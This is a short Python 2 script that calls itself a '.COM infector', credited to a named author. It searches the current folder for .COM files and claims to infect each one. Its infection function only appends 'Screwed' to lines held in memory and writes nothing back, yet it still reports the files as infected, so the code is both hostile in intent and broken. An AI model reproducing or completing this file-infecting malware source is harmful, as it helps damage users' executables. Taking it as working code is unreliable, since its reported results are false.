import sys, glob ,os

print "\n.COM infector By beenudel1986@gmail.com  "
print "\nUsage : ./com.py "

def infector(fname):
	for line in open(fname , 'rb').readlines():
		line = line[:-1] + 'Screwed'

if __name__ == '__main__':
	c=0
	for fname in glob.glob('*.COM'):
		c=c+1
		infector(fname)
	if (c==0):
		print "\n\n [-] No .COM files found"
	elif (c>0):
		print "\n\n  [-] Done :File infected = " ,c 



		